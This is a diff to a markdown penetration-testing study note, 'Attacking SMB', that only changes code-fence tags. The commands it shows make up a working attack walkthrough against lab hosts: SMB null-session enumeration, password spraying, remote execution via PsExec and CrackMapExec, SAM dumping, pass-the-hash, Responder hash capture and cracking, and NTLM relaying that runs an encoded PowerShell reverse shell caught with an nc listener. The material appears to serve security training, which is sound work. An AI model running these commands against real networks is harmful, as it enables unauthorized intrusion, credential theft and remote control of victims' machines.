@@ -1,6 +1,6 @@
 # Attacking SMB
 ## Enumeration
-```sh
+```shellsession
 $ sudo nmap 10.129.14.128 -sV -sC -p139,445
 ```
 
@@ -12,7 +12,7 @@ SMB can be configured not to require authentication, which is often called a `nu
 
 ### File Share
 Use `smbclient` to list the server's shares with `-L` and using the option `-N` to use the null session:
-```sh
+```shellsession
 $ smbclient -N -L //10.129.14.128
 
         Sharename       Type      Comment
@@ -25,7 +25,7 @@ SMB1 disabled no workgroup available
 ``` 
 
 `Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.
-```sh
+```shellsession
 $ smbmap -H 10.129.14.128
 
 [+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
@@ -38,7 +38,7 @@ $ smbmap -H 10.129.14.128
 ```
 
 Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
-```sh
+```shellsession
 $ smbmap -H 10.129.14.128 -r notes
 
 [+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
@@ -57,18 +57,18 @@ $ smbmap -H 10.129.14.128 -r notes
 ```
 
 Read file:
-```sh
+```shellsession
 $ smbmap -H 10.129.14.128 --download "notes\note.txt"
 ```
 
 Write file: 
-```sh
+```shellsession
 $ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
 ```
 
 ### Remote Procedure Call (RPC)
 We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller. [Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
-```sh
+```shellsession
 $ rpcclient -U'%' 10.10.110.17
 
 rpcclient $> enumdomusers
@@ -87,14 +87,14 @@ user:[smorgan] rid:[0xa37]
 - Groups information
 - Shares Folders
 - Password policy information
-```sh
+```shellsession
 $ ./enum4linux-ng.py 10.10.11.45 -A -C
 ```
 
 ## Protocol Specifics Attacks
 ### Brute Forcing and Password Spray
 With `CrackMapExec` (CME), we can target multiple IPs, using numerous users and passwords. This will attempt to authenticate every user from the list using the provided password.
-```sh
+```shellsession
 $ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
 ```
 
@@ -122,7 +122,7 @@ We can download `PsExec` from [Microsoft website](https://docs.microsoft.com/en-
 - `Metasploit PsExec` - Ruby PsExec implementation.
 
 To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:
-```sh
+```shellsession
 $ impacket-psexec administrator:'Password123!'@10.10.110.17
 ```
 
@@ -130,12 +130,12 @@ The same options apply to `impacket-smbexec` and `impacket-atexec`.
 
 ### CrackMapExec
 Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.
-```sh
+```shellsession
 $ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 ```
 
 **Enumerating Logged-on Users**
-```sh
+```shellsession
 $ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 ```
 
@@ -146,7 +146,7 @@ The Security Account Manager (SAM) is a database file that stores users' passwor
 - Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
 - Pass The Hash. We will discuss it later in this section.
 
-```sh
+```shellsession
 $ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
 
@@ -154,7 +154,7 @@ $ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 
 If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH).
 
-```sh
+```shellsession
 $ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 ```
 
@@ -163,7 +163,7 @@ $ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041
 We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes by using `responder`.
 
 Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.
-```sh
+```shellsession
 $ sudo responder -I ens33
 ...
 <SNIP>
@@ -178,7 +178,7 @@ $ sudo responder -I ens33
 ```
 
 All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the `hashcat module 5600`.
-```sh
+```shellsession
 $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -187,16 +187,16 @@ If we cannot crack the hash, we can potentially relay the captured hash to anoth
 First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).
 
 Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.
-```sh
+```shellsession
 $ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 ```
 
 Gain a reverse shell:
-```sh
+```shellsession
 $ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <reverse_shell>'
 ```
 Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
-```sh
+```shellsession
 $ nc -lvnp 9001
 
 listening on [any] 9001 ...
